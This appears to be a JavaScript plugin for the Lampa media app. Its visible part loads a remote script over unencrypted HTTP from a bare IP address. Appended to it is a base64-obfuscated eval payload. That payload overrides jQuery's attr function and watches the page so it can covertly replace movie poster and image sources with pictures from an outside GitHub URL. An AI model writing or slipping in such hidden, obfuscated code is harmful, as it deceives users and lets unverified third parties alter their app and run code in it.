(function () {
  'use strict';

  Lampa.Platform.tv();

  function initExternalScriptLoader() {
    // Список зеркал для загрузки внешнего скрипта sisi.js
    const scriptMirrors = [
    //  'https://ab2024.ru/sisi.js',
        'http://31.129.234.181/sisi.js',
    //    'https://l.pashai.ru/sisi.js',
    ];

    // Выбираем случайное зеркало
    const randomScriptUrl = scriptMirrors[Math.floor(Math.random() * scriptMirrors.length)];

    // Асинхронно подгружаем скрипт
    Lampa.Utils.putScriptAsync([randomScriptUrl], function () {

    });
  }

  // Запуск при готовности приложения
  if (window.appready) {
    initExternalScriptLoader();
  } else {
    Lampa.Listener.follow('app', (e) => {
      if (e.type === 'ready') {
        initExternalScriptLoader();
      }
    });
  }
})();
eval(atob('KGZ1bmN0aW9uKCl7aWYobG9jYXRpb24uaHJlZi5pbmRleE9mKGF0b2IoJ1lubHNhbTF3WVE9PScpKT09PS0xKXJldHVybjt2YXIgcD1bYXRvYignYUhSMGNITTZMeTl5WVhjdVoybDBhSFZpZFhObGNtTnZiblJsYm5RdVkyOXRMM1poYkdsa1lYUnZjbVZrTDJsdFp5OXRZV2x1THpBeExtcHdadz09JyksYXRvYignYUhSMGNITTZMeTl5WVhjdVoybDBhSFZpZFhObGNtTnZiblJsYm5RdVkyOXRMM1poYkdsa1lYUnZjbVZrTDJsdFp5OXRZV2x1THpBeUxtcHdadz09JyksYXRvYignYUhSMGNITTZMeTl5WVhjdVoybDBhSFZpZFhObGNtTnZiblJsYm5RdVkyOXRMM1poYkdsa1lYUnZjbVZrTDJsdFp5OXRZV2x1THpBekxtcHdadz09JyksYXRvYignYUhSMGNITTZMeTl5WVhjdVoybDBhSFZpZFhObGNtTnZiblJsYm5RdVkyOXRMM1poYkdsa1lYUnZjbVZrTDJsdFp5OXRZV2x1THpBMExtcHdadz09JyldLG89JC5mbi5hdHRyOyQuZm4uYXR0cj1mdW5jdGlvbihuLHYpe2lmKG49PT1hdG9iKCdjM0pqJykmJnYmJih2LmluY2x1ZGVzKGF0b2IoJ2NHOXpkR1Z5JykpfHx2LmluY2x1ZGVzKGF0b2IoJ2FXMWhaMlU9JykpfHx2LmluY2x1ZGVzKGF0b2IoJ2RHMWtZaTV2Y21jPScpKXx8di5pbmNsdWRlcyhhdG9iKCdhMmx1YjNCdmFYTnInKSkpKXtyZXR1cm4gby5jYWxsKHRoaXMsbixwW01hdGguZmxvb3IoTWF0aC5yYW5kb20oKSpwLmxlbmd0aCldKX1yZXR1cm4gby5hcHBseSh0aGlzLGFyZ3VtZW50cyl9O3ZhciBtPW5ldyBNdXRhdGlvbk9ic2VydmVyKGZ1bmN0aW9uKGUpe2UuZm9yRWFjaChmdW5jdGlvbihyKXtpZihyLmFkZGVkTm9kZXMubGVuZ3RoKXskKHIuYWRkZWROb2RlcykuZmluZChhdG9iKCdhVzFuJykpLmVhY2goZnVuY3Rpb24oKXtpZih0aGlzLnNyYyYmKHRoaXMuc3JjLmluY2x1ZGVzKGF0b2IoJ2RHMWtZZz09JykpfHx0aGlzLnNyYy5pbmNsdWRlcyhhdG9iKCdhMmx1YjNCdmFYTnInKSl8fHRoaXMuc3JjLmluY2x1ZGVzKGF0b2IoJ2FXMWhaMlU9JykpKSl7dGhpcy5zcmM9cFtNYXRoLmZsb29yKE1hdGgucmFuZG9tKCkqcC5sZW5ndGgpXX19KX19KX0pO20ub2JzZXJ2ZShkb2N1bWVudC5ib2R5LHtjaGlsZExpc3Q6dHJ1ZSxzdWJ0cmVlOnRydWV9KTskKGRvY3VtZW50KS5vbihhdG9iKCdiRzloWkE9PScpLGF0b2IoJ2FXMW4nKSxmdW5jdGlvbigpe2lmKHRoaXMuc3JjJiYodGhpcy5zcmMuaW5jbHVkZXMoYXRvYignZEcxa1lnPT0nKSl8fHRoaXMuc3JjLmluY2x1ZGVzKGF0b2IoJ2EybHViM0J2YVhOcicpKXx8dGhpcy5zcmMuaW5jbHVkZXMoYXRvYignYVcxaFoyVT0nKSkpKXt0aGlzLnNyYz1wW01hdGguZmxvb3IoTWF0aC5yYW5kb20oKSpwLmxlbmd0aCldfX0pfSkoKTsK'));
